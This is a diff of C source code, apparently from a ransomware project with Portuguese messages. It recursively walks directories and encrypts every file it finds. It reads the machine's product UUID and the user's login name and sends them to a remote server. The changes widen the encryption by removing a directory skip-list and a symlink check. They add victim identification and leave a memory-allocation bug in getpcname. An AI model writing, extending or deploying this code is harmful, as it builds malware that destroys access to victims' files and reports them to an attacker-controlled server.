@@ -15,7 +15,6 @@
 
 #include "funcs.h"
 
-char blacklist[][40] = {".", "..",".speech-dispatcher","X11"};
 struct dirent *getdir;
 
 void WhatIsDir(char *dir_sch){
@@ -33,27 +32,25 @@ void WhatIsDir(char *dir_sch){
 	while((getdir = readdir(diretorio)) != NULL){
 
 		if(strncmp(getdir->d_name,".",sizeof(getdir->d_name)) == 0 || strncmp(getdir->d_name,"..", sizeof(getdir->d_name)) == 0) continue;
-		if(strncmp(getdir->d_name,".speech-dispatcher",sizeof(getdir->d_name)) == 0 || strncmp(getdir->d_name,"X11", sizeof(getdir->d_name)) == 0) continue;
 		sprintf(pathdir , "%s%s",dir_sch , getdir->d_name);
 
 		stat(pathdir , &veirify);
-
+		strncat(pathdir, "/", sizeof(pathdir)-1);
 		if(S_ISDIR(veirify.st_mode)){
-			
-			strncat(pathdir, "/", sizeof(pathdir)-1);
-			printf("%s\n", pathdir);
-			printf("[ENTRANDO NO DIRETORIO]:  %s\n", getdir->d_name);
+			printf("[ENTRANDO NO DIRETORIO]:  %s\n", pathdir);
 			WhatIsDir(pathdir);
 		}
-		else if(!S_ISLNK(veirify.st_mode)){
-			printf("[CRIPTOGRAFANDO ARQUIVO]:  %s\n", getdir->d_name);
+		else{
+			printf("[CRIPTOGRAFANDO ARQUIVO]:  %s\n", pathdir);
 			encryptfile(pathdir);
 		}
 
 	}
 	closedir(diretorio);
 }
-void connectserver(char *uuid){
+
+
+void connectserver(char *uuid, char *hostname){
 	int sockfd;
 	int status;
 	printf("%s", uuid);
@@ -74,6 +71,10 @@ void connectserver(char *uuid){
 	if( (send(sockfd, uuid, strlen(uuid), 0)) < 0){
 		printf("[INFO]: Ocorreu um erro ao tentar enviar o uuid");
 	}
+
+	if( (send(sockfd, hostname, strlen(hostname), 0)) < 0){
+		printf("[INFO]: Ocorreu um erro ao tentar enviar o uuid");
+	}
 }
 
 void encryptfile(char *name_dir){
@@ -84,13 +85,12 @@ void encryptfile(char *name_dir){
 char *getuuid(){
 	FILE *uuid;
 	char id[140];
-	char *status;
 	char type[30];
 	char *completeid;
 
 	completeid = malloc(sizeof(char)*160);
-	uuid = fopen("/sys/class/dmi/id/product_uuid", "r");
 
+	uuid = fopen("/sys/class/dmi/id/product_uuid", "r");
 	memcpy(&type, "product_uuid", sizeof(type));
 
 	if(uuid == NULL){
@@ -109,7 +109,7 @@ char *getuuid(){
 	}
 
 	
-	status = fgets(id, sizeof(id), uuid);
+	fgets(id, sizeof(id), uuid);
 	
 	sprintf(completeid, "%s: %s", type, id);
 
@@ -118,5 +118,12 @@ char *getuuid(){
 }
 
 char *getpcname(){
+	char hostname[60];
+	char *name;
 
+	name = (char *) malloc(sizeof(60*sizeof(char)));
+
+  	getlogin_r(hostname, sizeof(hostname));
+	sprintf(name, "Nome: %s", hostname);
+	return name;
 }
